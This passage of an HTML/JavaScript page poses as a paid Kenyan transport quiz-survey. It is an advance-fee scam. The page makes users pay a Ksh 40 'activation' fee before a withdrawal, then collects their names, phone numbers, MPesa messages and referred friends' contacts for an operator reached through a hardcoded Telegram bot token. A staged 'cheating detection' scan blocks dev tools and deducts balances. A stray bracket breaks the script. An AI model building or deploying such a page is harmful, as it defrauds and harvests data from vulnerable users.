<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Transport && Infrastructure Survey | Summitsolutions .co.ke 2026</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
        body { background: linear-gradient(to right, #00c6ff, #0072ff); color: #fff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: flex-start; padding: 20px; }
        .container { background: rgba(0, 0, 0, 0.7); padding: 25px; border-radius: 20px; max-width: 900px; width: 100%; margin-top: 30px; box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3); }
        h1 { color: #ffeb3b; text-align: center; margin-bottom: 20px; text-shadow: 1px 1px 5px #000; }
        .question { background: rgba(255, 255, 255, 0.1); padding: 15px; margin-bottom: 15px; border-radius: 12px; }
        button { margin: 5px 0; padding: 10px 15px; border: none; border-radius: 10px; cursor: pointer; width: 100%; font-weight: 600; transition: 0.3s; }
        button:hover { transform: scale(1.03); }
        #balance { margin-top: 10px; font-size: 1.1rem; font-weight: 600; }
        #withdrawBtn, #submitBtn { background: #ffeb3b; color: #000; font-weight: 700; }
        #withdrawalSection, #submitSection { display: none; }
        #countdown { font-size: 1.2rem; text-align: center; margin: 15px 0; }
        
        input[type="text"],
        input[type="number"],
        textarea {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 8px;
            background-color: rgba(255, 255, 255, 0.2);
            color: #fff;
            transition: border-color 0.3s;
        }
        input[type="text"]:focus,
        input[type="number"]:focus,
        textarea:focus {
            border-color: #ffeb3b;
            outline: none;
        }
        
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }
        
        .modal-content {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            padding: 30px;
            border-radius: 20px;
            text-align: center;
            max-width: 400px;
            width: 90%;
            animation: slideIn 0.5s ease;
        }
        
        @keyframes slideIn {
            from { transform: translateY(-100px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
        
        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #ffeb3b;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .checkmark {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            display: block;
            stroke-width: 2;
            stroke: #fff;
            stroke-miterlimit: 10;
            margin: 20px auto;
            animation: fill 0.4s ease-in-out 0.4s forwards;
        }
        
        .checkmark-circle {
            stroke-dasharray: 166;
            stroke-dashoffset: 166;
            stroke-width: 2;
            stroke-miterlimit: 10;
            stroke: #7ac142;
            fill: none;
            animation: stroke 0.6s cubic-bezier(0.65, 0, 0.45, 1) forwards;
        }
        
        .checkmark-check {
            transform-origin: 50% 50%;
            stroke-dasharray: 48;
            stroke-dashoffset: 48;
            stroke: #fff;
            animation: stroke 0.3s cubic-bezier(0.65, 0, 0.45, 1) 0.8s forwards;
        }
        
        @keyframes stroke {
            100% { stroke-dashoffset: 0; }
        }
        
        .cross-mark {
            width: 80px;
            height: 80px;
            position: relative;
            margin: 20px auto;
        }
        
        .cross-mark:before, .cross-mark:after {
            content: '';
            position: absolute;
            width: 100%;
            height: 8px;
            background: #ff4444;
            top: 50%;
            left: 0;
            transform: translateY(-50%) rotate(45deg);
            animation: crossSpin 0.3s ease;
        }
        
        .cross-mark:after {
            transform: translateY(-50%) rotate(-45deg);
        }
        
        @keyframes crossSpin {
            from { transform: translateY(-50%) rotate(0deg); opacity: 0; }
            to { transform: translateY(-50%) rotate(45deg); opacity: 1; }
        }
        
        .whatsapp-support {
            margin-top: 20px;
            padding: 15px;
            background: #25D366;
            border-radius: 50px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            transition: 0.3s;
        }
        
        .whatsapp-support:hover {
            background: #128C7E;
            transform: scale(1.05);
        }
        
        .whatsapp-support a {
            color: white;
            text-decoration: none;
            font-weight: 600;
        }
        
        #accountActivationCheck {
            margin: 15px 0;
        }
        
        label {
            display: flex;
            align-items: center;
            gap: 10px;
            cursor: pointer;
            color: #fff;
        }
        
        input[type="checkbox"] {
            width: 20px;
            height: 20px;
            cursor: pointer;
        }
        
        .error-message {
            color: #ff4444;
            font-size: 0.9rem;
            margin-top: 5px;
        }
        
        .cheating-scan {
            background: rgba(0, 0, 0, 0.9);
            padding: 20px;
            border-radius: 15px;
            text-align: center;
            margin: 10px 0;
            border: 2px solid #ff4444;
            animation: pulse 1s infinite;
        }
        
        @keyframes pulse {
            0% { border-color: #ff4444; }
            50% { border-color: #ff9900; }
            100% { border-color: #ff4444; }
        }
        
        .scan-line {
            width: 100%;
            height: 2px;
            background: linear-gradient(to right, transparent, #ff4444, transparent);
            animation: scan 2s linear infinite;
            margin: 10px 0;
        }
        
        @keyframes scan {
            0% { transform: translateX(-100%); }
            100% { transform: translateX(100%); }
        }
        
        /* Referral Section Styles */
        .referral-section {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            padding: 20px;
            border-radius: 15px;
            margin: 20px 0;
            text-align: center;
            border: 2px solid #ffeb3b;
        }
        
        .referral-title {
            color: #ffeb3b;
            font-size: 1.5rem;
            margin-bottom: 10px;
        }
        
        .referral-link-container {
            display: flex;
            gap: 10px;
            margin: 15px 0;
            flex-wrap: wrap;
        }
        
        .referral-input {
            flex: 1;
            min-width: 200px;
            padding: 12px;
            border: 2px solid #ffeb3b;
            border-radius: 8px;
            background: rgba(255, 255, 255, 0.1);
            color: #fff;
            font-size: 14px;
        }
        
        .copy-btn {
            background: #ffeb3b;
            color: #000;
            padding: 12px 25px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 600;
            transition: 0.3s;
            white-space: nowrap;
        }
        
        .copy-btn:hover {
            transform: scale(1.05);
            background: #ffd700;
        }
        
        .share-buttons {
            display: flex;
            gap: 10px;
            justify-content: center;
            flex-wrap: wrap;
            margin-top: 15px;
        }
        
        .share-btn {
            padding: 10px 20px;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            font-weight: 600;
            transition: 0.3s;
            display: flex;
            align-items: center;
            gap: 8px;
            color: white;
        }
        
        .share-btn:hover {
            transform: translateY(-3px);
        }
        
        .whatsapp-share { background: #25D366; }
        .twitter-share { background: #1DA1F2; }
        .facebook-share { background: #4267B2; }
        .telegram-share { background: #0088cc; }
        
        .share-btn i {
            font-size: 18px;
        }
        
        .copied-message {
            color: #4CAF50;
            font-size: 14px;
            margin-top: 5px;
            display: none;
        }
        
        .duplicate-alert {
            background: rgba(255, 68, 68, 0.2);
            border: 2px solid #ff4444;
            padding: 15px;
            border-radius: 10px;
            margin: 10px 0;
            text-align: center;
            animation: shake 0.5s ease;
        }
        
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-10px); }
            75% { transform: translateX(10px); }
        }
        
        /* Referral Submission Styles */
        .referral-dropdown-btn {
            background: #4CAF50;
            color: white;
            padding: 12px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 600;
            margin: 10px 0;
            transition: 0.3s;
        }
        
        .referral-dropdown-btn:hover {
            background: #45a049;
            transform: scale(1.02);
        }
        
        .referral-submission-form {
            background: rgba(255, 255, 255, 0.1);
            padding: 20px;
            border-radius: 10px;
            margin: 15px 0;
            display: none;
            border: 2px solid #ffeb3b;
        }
        
        .referral-submission-form input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ffeb3b;
            border-radius: 5px;
            background: rgba(255, 255, 255, 0.2);
            color: white;
        }
        
        .referral-submission-form input::placeholder {
            color: rgba(255, 255, 255, 0.7);
        }
        
        .submit-referral-btn {
            background: #ffeb3b;
            color: #000;
            padding: 12px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 600;
            margin-top: 10px;
        }
        
        .submit-referral-btn:hover {
            background: #ffd700;
        }
        
        .referral-status {
            margin-top: 15px;
            padding: 10px;
            border-radius: 5px;
            display: none;
        }
        
        .referral-status.pending {
            background: rgba(255, 193, 7, 0.2);
            border: 1px solid #ffc107;
        }
        
        .referral-status.approved {
            background: rgba(76, 175, 80, 0.2);
            border: 1px solid #4CAF50;
        }
        
        .referral-status.rejected {
            background: rgba(244, 67, 54, 0.2);
            border: 1px solid #f44336;
        }
        
        .test-message {
            background: #2196F3;
            color: white;
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
            font-size: 14px;
            display: none;
        }
    </style>
</head>
<body>
<div class="container">
    <h1>Health Survey</h1>
    <button id="startSessionBtn">Start Survey</button>
    <div id="countdown"></div>
    <div id="survey-container"></div>
    
    <!-- Test Message (Hidden by default) -->
    <div id="testMessage" class="test-message"></div>
    
    <!-- Referral Section -->
    <div class="referral-section" id="referralSection">
        <div class="referral-title">üéÅ Share & Earn More!</div>
        <p>Share this link with friends and earn bonuses when they join!</p>
        <div class="referral-link-container">
            <input type="text" class="referral-input" id="referralLink" value="https://urlvanish.com/48faafbd" readonly>
            <button class="copy-btn" onclick="copyReferralLink()">üìã Copy Link</button>
        </div>
        <div class="copied-message" id="copiedMessage">‚úì Link copied to clipboard!</div>
        <div class="share-buttons">
            <button class="share-btn whatsapp-share" onclick="shareViaWhatsApp()">
                <span>üì±</span> WhatsApp
            </button>
            <button class="share-btn twitter-share" onclick="shareViaTwitter()">
                <span>üê¶</span> Twitter
            </button>
            <button class="share-btn facebook-share" onclick="shareViaFacebook()">
                <span>üìò</span> Facebook
            </button>
            <button class="share-btn telegram-share" onclick="shareViaTelegram()">
                <span>‚úàÔ∏è</span> Telegram
            </button>
        </div>
        
        <!-- Referral Submission Dropdown -->
        <button class="referral-dropdown-btn" onclick="toggleReferralForm()">üëá Referred Someone? Click Here</button>
        
        <div class="referral-submission-form" id="referralSubmissionForm">
            <h3 style="color: #ffeb3b; margin-bottom: 15px;">Referral Verification</h3>
            <p style="margin-bottom: 15px;">Enter details of the person you referred:</p>
            <input type="text" id="referredName" placeholder="Referred Person's Full Name" required>
            <input type="text" id="referredPhone" placeholder="Referred Person's Phone Number" required>
            <button class="submit-referral-btn" onclick="submitReferral()">Submit for Verification</button>
            <div id="referralStatus" class="referral-status"></div>
        </div>
    </div>
    
    <div id="balance">Your balance: Ksh 0</div>
    <button id="withdrawBtn">Withdraw</button>
    <button id="submitBtn">Submit Withdrawal Request</button>

    <div id="withdrawalSection">
        <div id="accountActivationCheck">
            <label>
                <input type="checkbox" id="activationCheckbox"> I have activated my account with Ksh 40
            </label>
        </div>
        <div id="withdrawalForm" style="display: none;">
            <input type="text" id="username" placeholder="Enter your full name" required />
            <input type="text" id="phoneNumber" placeholder="Enter your phone number" required />
            <input type="number" id="withdrawAmount" placeholder="Amount to withdraw (max Ksh 65)" min="1" max="65" required />
            <textarea id="commentBox" placeholder="MPesa verification message (copy and paste the exact message)" rows="4" maxlength="500"></textarea>
            <div id="duplicateMessageAlert" style="display: none;" class="duplicate-alert">
                ‚ö†Ô∏è This MPesa message has already been submitted. Please use a different message.
            </div>
            <button id="submitWithdrawalBtn">Submit for Verification</button>
        </div>
    </div>

    <!-- Verification Modal -->
    <div id="verificationModal" class="modal">
        <div class="modal-content">
            <h3 id="modalTitle">Verification in Progress</h3>
            <div id="modalSpinner" class="spinner"></div>
            <div id="modalContent"></div>
            <p id="modalMessage">Please wait while admin verifies your payment...</p>
            <div id="whatsappSupport" class="whatsapp-support" style="display: none;">
                <span>üì±</span>
                <a href="#" id="whatsappLink" target="_blank">Contact WhatsApp Support</a>
            </div>
        </div>
    </div>
    <!-- Cheating Detection Modal -->
    <div id="cheatingModal" class="modal">
        <div class="modal-content">
            <h3 id="cheatingTitle">‚ö†Ô∏è CHEATING DETECTED</h3>
            <div id="cheatingSpinner" class="spinner"></div>
            <div id="cheatingScan" class="cheating-scan" style="display: none;">
                <p>Scanning for cheating activities...</p>
                <div class="scan-line"></div>
            </div>
            <div id="cheatingContent"></div>
            <p id="cheatingMessage">Running security check...</p>
        </div>
    </div>
    
    <!-- Referral Verification Modal -->
    <div id="referralVerificationModal" class="modal">
        <div class="modal-content">
            <h3 id="referralModalTitle">Referral Verification</h3>
            <div id="referralModalSpinner" class="spinner"></div>
            <div id="referralModalContent"></div>
            <p id="referralModalMessage">Waiting for admin to verify referral...</p>
            <div id="referralWhatsappSupport" class="whatsapp-support" style="display: none;">
                <span>üì±</span>
                <a href="#" id="referralWhatsappLink" target="_blank">Contact WhatsApp Support</a>
            </div>
        </div>
    </div>

    <p style="margin-top:10px;font-size:0.9rem;">¬© Summit solutions.co.ke 2026. All rights reserved.</p>
</div>

<script>
// ============================================
// QUESTIONS ARRAY - YOU CAN ADD UP TO 30 MORE QUESTIONS HERE
// ============================================
// Simply add more question objects below, following the same format
// The code will automatically handle any number of questions
const questions = [
    // Question 1
{q:"What is the primary purpose of a 'Dry Port' in logistics networks?", a:["Storing hazardous waste","Extending seaport services inland via rail or road","Repairing cargo ships","Manufacturing shipping containers"], correct:1},
{q:"In highway engineering, what does 'Level of Service' (LOS) measure?", a:["Road construction cost","Traffic flow quality and congestion conditions","Bridge structural strength","Fuel efficiency of vehicles"], correct:1},
{q:"Which technology enables 'Electronic Toll Collection' without stopping vehicles?", a:["Manual ticketing","RFID transponders","Paper permits","Cash booths"], correct:1},
{q:"What is the main function of 'Ballast' in railway tracks?", a:["Powering the train","Absorbing loads and stabilizing the track","Reducing ticket prices","Improving Wi-Fi connectivity"], correct:1},
{q:"In airport design, what is the role of a 'People Mover' system?", a:["Transporting cargo only","Moving passengers between terminals efficiently","Refueling aircraft","Handling baggage sorting"], correct:1},
{q:"What does 'Peak Load Management' address in power infrastructure?", a:["Reducing voltage permanently","Balancing electricity demand during high-usage periods","Eliminating renewable energy","Increasing transformer size only"], correct:1},
{q:"Which concept refers to designing streets for all users including pedestrians, cyclists, and motorists?", a:["Expressway Model","Complete Streets","Freight Corridor Design","Industrial Zoning"], correct:1},
{q:"In port operations, what is 'Dwell Time'?", a:["Time ships spend at sea","Time cargo remains at a terminal before clearance","Crew rest duration","Container manufacturing time"], correct:1},
{q:"What is the primary benefit of 'District Heating' systems?", a:["Individual home boilers","Centralized heat generation for multiple buildings","Cooling office towers","Reducing internet usage"], correct:1},
{q:"Which engineering structure is specifically built to control flooding by holding back water?", a:["Aqueduct","Dam","Viaduct","Culvert"], correct:1},
{q:"What is the purpose of 'Green Roofs' in urban infrastructure?", a:["Increase parking space","Improve insulation and manage stormwater","Support heavy machinery","Reduce elevator usage"], correct:1},
{q:"In telecommunications infrastructure, what does '5G Small Cells' primarily improve?", a:["Water pressure","Wireless network capacity and speed","Rail safety","Bridge durability"], correct:1},
{q:"What is 'Load Factor' in transportation planning?", a:["Road width measurement","Percentage of capacity being used","Bridge height ratio","Fuel tank volume"], correct:1},
{q:"Which infrastructure financing model involves private entities designing, building, and operating public projects?", a:["Public Monopoly","PPP (Public-Private Partnership)","State Subsidy Model","Crowdfunding Only"], correct:1},
{q:"What is the main objective of 'Stormwater Management Systems'?", a:["Increase rainfall","Prevent flooding and control runoff","Enhance road speed","Cool underground tunnels"], correct:1},
{q:"In rail systems, what does 'Electrification' primarily reduce compared to diesel?", a:["Track length","Carbon emissions and noise","Passenger seating","Ticket prices automatically"], correct:1},
{q:"Which urban transport solution prioritizes buses with dedicated lanes and rapid boarding?", a:["Light Rail","Metro System","Bus Rapid Transit (BRT)","Cable Car"], correct:2},
{q:"What is the function of a 'Retaining Wall' in civil engineering?", a:["Decorative landscaping","Holding back soil and preventing landslides","Reducing traffic noise only","Supporting electrical wires"], correct:1},
{q:"What does 'Microgrid' refer to in energy systems?", a:["Small gasoline generator","Localized energy system operating independently or with the grid","High-voltage transmission tower","Underground subway line"], correct:1},
{q:"In water supply systems, what is 'Desalination' used for?", a:["Cooling turbines","Removing salt from seawater for drinking","Increasing mineral content","Irrigating deserts only"], correct:1},
{q:"Which pavement design technique increases permeability to reduce surface runoff?", a:["Rigid concrete slab","Permeable pavement","Steel decking","Asphalt overlay only"], correct:1},
{q:"What is the primary role of a 'Control Tower' at an airport?", a:["Selling tickets","Managing aircraft movements on ground and in airspace","Repairing engines","Refueling planes"], correct:1},
{q:"In logistics, what does 'Cross-Docking' minimize?", a:["Transportation modes","Warehouse storage time","Driver wages","Customs regulations"], correct:1},
{q:"What is 'Resilience Engineering' in infrastructure focused on?", a:["Aesthetic improvements","Ability to withstand and recover from disruptions","Lowering construction wages","Reducing signage"], correct:1},
{q:"Which structure carries water across a valley or gap?", a:["Tunnel","Aqueduct","Breakwater","Hangar"], correct:1},
{q:"What is the purpose of 'Traffic Signal Synchronization'?", a:["Increase red light duration","Improve traffic flow along corridors","Eliminate pedestrian crossings","Reduce road signage"], correct:1},
{q:"In coastal engineering, what is a 'Breakwater' designed to do?", a:["Increase wave height","Protect shorelines and harbors from waves","Deepen shipping lanes","Generate electricity only"], correct:1},
{q:"What does 'Urban Heat Island Effect' primarily result from?", a:["Excessive tree planting","High concentration of buildings and pavement absorbing heat","Underground tunnels","Wind turbines"], correct:1},
{q:"Which infrastructure system manages underground wastewater transport?", a:["Irrigation network","Sewer system","Cable conduit","Metro rail"], correct:1},
{q:"What is the primary purpose of 'Wayfinding Systems' in transport hubs?", a:["Increase retail sales","Help users navigate spaces efficiently","Monitor structural load","Control ventilation"], correct:1}
]
  // ============================================
    // ADD MORE QUESTIONS BELOW THIS LINE
    // ============================================
    // Copy and paste this template for each new question:
    // ,
    // { 
    //     q: "Your question here?", 
    //     a: ["Option 1", "Option 2", "Option 3", "Option 4"], 
    //     correct: 0  // 0 for first option, 1 for second, etc.
    // }
    // ============================================
];

let db;
let balance = 0;
let answeredToday = 0;
let lastAnswerDate = '';
let surveyActive = false;
let currentQuestionIndex = 0;
let surveyTimer = null;
let cheatingDetected = false;
let submissionCount = 0;
// Telegram Bot Configuration - VERIFY THESE ARE CORRECT
const BOT_TOKEN = "8585104821:AAFXZn3g7QG9NsCmLmZuyfviQkPddOYMJzc";
const CHAT_ID = "8468538314";
let lastUpdateId = 0;
let cheatingCheckInterval = null;
let surveyStartTime = null;
const submittedMessages = new Set();
let pendingReferrals = [];
let referralCheckInterval = null;

// IndexedDB setup - Increased version to ensure schema updates
const request = indexedDB.open("TransportSurveyDB",1);

request.onupgradeneeded = (e) => {
    db = e.target.result;
    if (!db.objectStoreNames.contains("progress")) {
        db.createObjectStore("progress", { keyPath: "id" });
    }
    if (!db.objectStoreNames.contains("submissions")) {
        db.createObjectStore("submissions", { keyPath: "id", autoIncrement: true });
    }
    if (!db.objectStoreNames.contains("messages")) {
        db.createObjectStore("messages", { keyPath: "message" });
    }
    if (!db.objectStoreNames.contains("referrals")) {
        db.createObjectStore("referrals", { keyPath: "id", autoIncrement: true });
    }
    console.log("Database upgraded successfully");
};

request.onsuccess = (e) => {
    db = e.target.result;
    console.log("Database opened successfully");
    loadProgress();
    loadSubmittedMessages();
    loadPendingReferrals();
    
    // Test Telegram connection on load
    testTelegramConnection();
};

request.onerror = (e) => console.log("DB error", e);

// Test Telegram Connection
async function testTelegramConnection() {
    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
        const data = await response.json();
        if (data.ok) {
            console.log("‚úÖ Telegram Bot Connected:", data.result.username);
            showTestMessage("‚úÖ WELCOME!! to daily survey's you can start");
            
            // Send a test message
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: "üü¢ System Online - Transport&& infrastructure Survey Bot is ready to receive submissions"
                })
            });
        } else {
            console.error("‚ùå Telegram Bot Connection Failed");
            showTestMessage("‚ùå  Connection Failed - Check internet");
        }
    } catch (error) {
        console.error("Telegram test error:", error);
        showTestMessage("‚ùå Not connected - Check internet");
    }
}

function showTestMessage(msg) {
    const testMsg = document.getElementById("testMessage");
    testMsg.style.display = "block";
    testMsg.innerHTML = msg;
    setTimeout(() => {
        testMsg.style.display = "none";
    }, 5000);
}

function loadProgress() {
    if (!db) return;
    const tx = db.transaction("progress", "readonly");
    const store = tx.objectStore("progress");
    const getReq = store.get("user1");
    
    getReq.onsuccess = () => {
        const data = getReq.result;
        if (data) {
            balance = data.balance || 0;
            lastAnswerDate = data.lastDate || '';
            answeredToday = (data.lastDate === new Date().toDateString()) ? (data.answeredToday || 0) : 0;
            submissionCount = data.submissionCount || 0;
            updateBalance();
        }
    };
}

function loadSubmittedMessages() {
    if (!db) return;
    const tx = db.transaction("messages", "readonly");
    const store = tx.objectStore("messages");
    const getAllReq = store.getAll();
    
    getAllReq.onsuccess = () => {
        const messages = getAllReq.result;
        messages.forEach(msg => submittedMessages.add(msg.message));
    };
}

function loadPendingReferrals() {
    if (!db) return;
    const tx = db.transaction("referrals", "readonly");
    const store = tx.objectStore("referrals");
    const getAllReq = store.getAll();
    
    getAllReq.onsuccess = () => {
        pendingReferrals = getAllReq.result.filter(ref => ref.status === 'pending');
    };
}

function saveProgress() {
    if (!db) return;
    const tx = db.transaction("progress", "readwrite");
    const store = tx.objectStore("progress");
    store.put({ 
        id: "user1", 
        balance: balance, 
        lastDate: new Date().toDateString(), 
        answeredToday: answeredToday,
        submissionCount: submissionCount
    });
}

function updateBalance() {
    document.getElementById("balance").innerText = "Your balance: Ksh " + balance;
}

// FIXED ANTI-CHEATING SYSTEM
function startAntiCheatingMonitoring() {
    if (cheatingCheckInterval) {
        clearInterval(cheatingCheckInterval);
    }
    
    // 5-second grace period
    let gracePeriod = true;
    setTimeout(() => {
        gracePeriod = false;
        console.log("Anti-cheating system now active");
    }, 5000);
    
    cheatingCheckInterval = setInterval(() => {
        if (!surveyActive || cheatingDetected) return;
        if (gracePeriod) return;
        
        // Only check for obvious cheating
        if (!document.hasFocus()) {
            setTimeout(() => {
                if (surveyActive && !document.hasFocus() && !gracePeriod) {
                    if (!document.hasFocus()) {
                        stopSurvey("Tab/window switched");
                    }
                }
            }, 2000);
            return;
        }
        
        // Dev tools detection - high threshold
        const widthThreshold = window.outerWidth - window.innerWidth > 300;
        const heightThreshold = window.outerHeight - window.innerHeight > 300;
        
        if (widthThreshold || heightThreshold) {
            stopSurvey("Developer tools detected");
            return;
        }
    }, 1000);
}

// Visibility change detection
document.addEventListener("visibilitychange", function () {
    if (document.hidden && surveyActive) {
        if (Date.now() - surveyStartTime < 5000) return;
        
        setTimeout(() => {
            if (document.hidden && surveyActive) {
                stopSurvey("Tab switching detected");
            }
        }, 1000);
    }
});

// Keyboard shortcut blocking
document.addEventListener("keydown", function (e) {
    if (surveyActive) {
        if (Date.now() - surveyStartTime < 5000) return;
        
        if (e.key === "F12" || 
            (e.ctrlKey && e.shiftKey && (e.key === "I" || e.key === "J" || e.key === "C"))) {
            e.preventDefault();
            stopSurvey("Developer tools detected");
            return;
        }
    }
});

// Block right click
document.addEventListener("contextmenu", function (e) {
    if (surveyActive) {
        if (Date.now() - surveyStartTime < 5000) return;
        e.preventDefault();
        stopSurvey("Right-click detected");
    }
});

async function stopSurvey(reason) {
    if (!surveyActive || cheatingDetected) return;
    
    if (Date.now() - surveyStartTime < 5000) {
        console.log("Ignoring during startup:", reason);
        return;
    }
    
    surveyActive = false;
    cheatingDetected = true;
    
    if (surveyTimer) {
        clearInterval(surveyTimer);
        surveyTimer = null;
    }
    
    if (cheatingCheckInterval) {
        clearInterval(cheatingCheckInterval);
        cheatingCheckInterval = null;
    }
    
    const modal = document.getElementById("cheatingModal");
    const title = document.getElementById("cheatingTitle");
    const spinner = document.getElementById("cheatingSpinner");
    const scan = document.getElementById("cheatingScan");
    const content = document.getElementById("cheatingContent");
    const message = document.getElementById("cheatingMessage");
    
    modal.style.display = "flex";
    title.innerText = "‚ö†Ô∏è CHEATING DETECTED";
    spinner.style.display = "block";
    scan.style.display = "none";
    content.innerHTML = "";
    message.innerText = "Running security check...";
    
    await new Promise(resolve => setTimeout(resolve, 1500));
    
    spinner.style.display = "none";
    scan.style.display = "block";
    message.innerText = "Scanning for cheating activities...";
    
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    scan.style.display = "none";
    content.innerHTML = `<div class="cross-mark"></div>`;
    message.innerText = "‚ùå CHEATING FOUND! Penalty: Ksh 5 deducted";
    
    balance = Math.max(0, balance - 5);
    updateBalance();
    saveProgress();
    
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    modal.style.display = "none";
    
    setTimeout(() => {
        cheatingDetected = false;
    }, 3000);
    
    document.getElementById("survey-container").innerHTML = `<div class="question" style="text-align: center;">
        <h3>‚ö†Ô∏è Survey Ended Due to Cheating</h3>
        <p>Ksh 5 has been deducted from your balance.</p>
        <p>You can start a new survey in a few seconds.</p>
    </div>`;
    document.getElementById("countdown").style.display = "none";
    document.getElementById("startSessionBtn").style.display = "block";
}

function startSurvey() {
    if (cheatingDetected) {
        alert("Please wait a moment before starting a new survey.");
        return;
    }
    
    const today = new Date().toDateString();
    if (lastAnswerDate !== today) {
        answeredToday = 0;
        lastAnswerDate = today;
        saveProgress();
    }
    
    if (answeredToday >= 3) {
        document.getElementById("survey-container").innerHTML = "<h3>‚úÖ Daily limit reached (3/3). Come back tomorrow!</h3>";
        return;
    }
    
    surveyStartTime = Date.now();
    surveyActive = true;
    cheatingDetected = false;
    currentQuestionIndex = 0;
    const container = document.getElementById("survey-container");
    const countdown = document.getElementById("countdown");
    const startBtn = document.getElementById("startSessionBtn");
    
    container.style.display = "block";
    countdown.style.display = "block";
    startBtn.style.display = "none";
    
    let timeLeft = 120;
    
    const showQuestion = () => {
        if (currentQuestionIndex >= questions.length) {
            container.innerHTML = "<h3>üéâ All questions completed!</h3>";
            countdown.style.display = "none";
            surveyActive = false;
            startBtn.style.display = "block";
            return;
        }
        
        const q = questions[currentQuestionIndex];
        container.innerHTML = `<div class="question">
            <p><strong>Question ${currentQuestionIndex + 1}:</strong> ${q.q}</p>
            ${q.a.map((opt, i) => `<button class="answer-btn" data-index="${i}">${opt}</button>`).join("")}
        </div>`;
        
        document.querySelectorAll('.answer-btn').forEach(btn => {
            btn.addEventListener('click', function() {
                if (!surveyActive) return;
                answer(parseInt(this.dataset.index));
            });
        });
    };
    
    window.answer = function(choice) {
        if (!surveyActive) return;
        
        const q = questions[currentQuestionIndex];
        
        if (choice === q.correct) {
            balance += 10;
            answeredToday++;
            updateBalance();
            
            currentQuestionIndex++;
            saveProgress();
            
            if (answeredToday >= 3) {
                container.innerHTML = "<h3>‚úÖ Daily limit reached (3/3)! Come back tomorrow.</h3>";
                countdown.style.display = "none";
                surveyActive = false;
                startBtn.style.display = "block";
                if (surveyTimer) {
                    clearInterval(surveyTimer);
                    surveyTimer = null;
                }
                return;
            }
            
            if (currentQuestionIndex < questions.length) {
                showQuestion();
                timeLeft = 120;
            } else {
                container.innerHTML = "<h3>üéâ All questions completed! You've mastered the survey.</h3>";
                countdown.style.display = "none";
                surveyActive = false;
                startBtn.style.display = "block";
            }
        } else {
            balance -= 7;
            updateBalance();
            container.innerHTML = "<h3>‚ùå Wrong Answer! Survey ended.</h3><p>Come back tomorrow for new questions.</p>";
            countdown.style.display = "none";
            surveyActive = false;
            startBtn.style.display = "block";
            
            if (surveyTimer) {
                clearInterval(surveyTimer);
                surveyTimer = null;
            }
            
            saveProgress();
        }
    };
    
    countdown.innerText = `Time left: 2:00`;
    
    if (surveyTimer) clearInterval(surveyTimer);
    surveyTimer = setInterval(() => {
        timeLeft--;
        const minutes = Math.floor(timeLeft / 60);
        const seconds = timeLeft % 60;
        countdown.innerText = `Time left: ${minutes}:${seconds.toString().padStart(2, '0')}`;
        
        if (timeLeft <= 0) {
            clearInterval(surveyTimer);
            if (surveyActive) {
                container.innerHTML = "<h3>‚è∞ Time's up! Survey ended.</h3><p>Come back tomorrow.</p>";
                surveyActive = false;
                startBtn.style.display = "block";
                saveProgress();
            }
            countdown.style.display = "none";
        }
    }, 1000);
    
    showQuestion();
    startAntiCheatingMonitoring();
}

// Start Session Button
document.getElementById("startSessionBtn").onclick = function() {
    startSurvey();
};

// Withdraw Button Logic
document.getElementById("withdrawBtn").onclick = function() {
    if (balance >= 100) {
        if (confirm("‚ö†Ô∏è Activate your account with Ksh 40 to proceed with withdrawal. Click OK to activate now.")) {
            window.location.href = "https://summitsolutions28.github.io/Well8372/S1920.html";
        }
    } else {
        alert(`‚ùå You need at least Ksh 100 to withdraw. Your current balance: Ksh ${balance}`);
    }
};
// Submit Button Logic
document.getElementById("submitBtn").onclick = function() {
    if (balance < 100) {
        alert("‚ùå You need at least Ksh 100 to withdraw. Your current balance: Ksh " + balance);
        return;
    }
    
    document.getElementById("withdrawalSection").style.display = "block";
    document.getElementById("withdrawalForm").style.display = "none";
    document.getElementById("activationCheckbox").checked = false;
};

// Activation checkbox handler
document.getElementById("activationCheckbox").addEventListener("change", function(e) {
    if (e.target.checked) {
        document.getElementById("withdrawalForm").style.display = "block";
    } else {
        document.getElementById("withdrawalForm").style.display = "none";
    }
});

// MPesa message duplicate check
document.getElementById("commentBox").addEventListener("input", function(e) {
    const message = e.target.value.trim();
    const duplicateAlert = document.getElementById("duplicateMessageAlert");
    const submitBtn = document.getElementById("submitWithdrawalBtn");
    
    if (message && submittedMessages.has(message)) {
        duplicateAlert.style.display = "block";
        submitBtn.disabled = true;
        submitBtn.style.opacity = "0.5";
        submitBtn.style.cursor = "not-allowed";
